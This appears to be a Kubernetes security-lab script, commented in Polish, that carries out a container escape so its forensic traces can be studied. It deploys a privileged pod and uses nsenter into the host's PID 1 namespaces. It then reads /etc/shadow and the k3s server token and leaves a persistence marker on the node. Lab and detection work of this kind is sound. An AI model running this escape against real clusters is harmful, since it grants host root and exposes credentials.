#!/usr/bin/env bash
# Scenariusz 1: ucieczka z kontenera przez privileged pod (ATT&CK T1610, T1611).
# Uruchamiane na HOŚCIE (stacja analityka) z działającym kubectl do klastra labu.
#
# Przebieg:
#   deploy  — tworzy namespace i uprzywilejowanego poda (pod.yaml)
#   escape  — z wnętrza poda wchodzi `nsenter` w przestrzenie nazw hosta (PID 1),
#             czyta pliki dostępne tylko rootowi na węźle i zostawia marker persystencji
#   clean   — usuwa poda i namespace (UWAGA: przed usunięciem zrób triage!)
# Bez argumentu: deploy + escape.
#
# Scenariusz uruchamiamy dwa razy: w fazie A (make phase-a) i w fazie B (make phase-b),
# za każdym razem porównując, jakie ślady zostają. Zebranie dowodów: make triage.
# shellcheck source=infra/lib.sh
source "$(dirname "$0")/../../infra/lib.sh"
need kubectl
export KUBECONFIG=${KUBECONFIG:-$KUBECONFIG_PATH}

NS=${NS:-dev}
POD=${POD:-privesc}
DIR=$(cd "$(dirname "$0")" && pwd)
MARKER="/krycy-pwned-scenariusz1"

deploy() {
  log "scenariusz 1: tworzę namespace $NS i uprzywilejowanego poda $POD"
  kubectl create namespace "$NS" --dry-run=client -o yaml | kubectl apply -f -
  kubectl apply -n "$NS" -f "$DIR/pod.yaml"
  kubectl wait -n "$NS" --for=condition=Ready "pod/$POD" --timeout=120s
  node=$(kubectl get pod -n "$NS" "$POD" -o jsonpath='{.spec.nodeName}')
  log "pod $POD działa na węźle: $node"
}

# Polecenia wykonywane JUŻ NA HOŚCIE (po przeskoczeniu z kontenera).
# nsenter przejmuje przestrzenie nazw procesu 1 (hosta): mnt, uts, ipc, net, pid.
host_cmds='
echo "== jesteśmy na hoście =="
hostname
id
echo "--- /etc/machine-id (tożsamość węzła) ---"; cat /etc/machine-id 2>/dev/null
echo "--- pierwsza linia /etc/shadow (dowód roota na hoście) ---"; head -n1 /etc/shadow 2>/dev/null
echo "--- token k3s (jeśli to węzeł-serwer) ---"; cat /var/lib/rancher/k3s/server/token 2>/dev/null || echo "(brak: to węzeł-agent)"
echo "--- persystencja: zostawiam marker '"$MARKER"' ---"; echo "krycy $(date -u +%FT%TZ)" > '"$MARKER"'; ls -l '"$MARKER"'
'

escape() {
  log "scenariusz 1: ucieczka z kontenera przez nsenter (proces 1 hosta)"
  # busybox ma applet nsenter; hostPID daje widoczność PID 1, privileged daje uprawnienia
  kubectl exec -n "$NS" "$POD" -- \
    nsenter --target 1 --mount --uts --ipc --net --pid -- sh -c "$host_cmds"
  log "gotowe. Teraz: make triage NS=$NS POD=$POD, potem porównaj fazy A/B"
}

clean() {
  warn "usuwam poda i namespace $NS — rób to DOPIERO po triage (dowody przepadną)"
  kubectl delete -n "$NS" -f "$DIR/pod.yaml" --ignore-not-found --wait=false
  kubectl delete namespace "$NS" --ignore-not-found --wait=false
  warn "marker $MARKER pozostaje na węźle (persystencja) — usuń go ręcznie po analizie"
}

case ${1:-all} in
  deploy) deploy ;;
  escape) escape ;;
  clean)  clean ;;
  all)    deploy; escape ;;
  *) echo "Użycie: $0 [deploy|escape|clean]" >&2; exit 2 ;;
esac
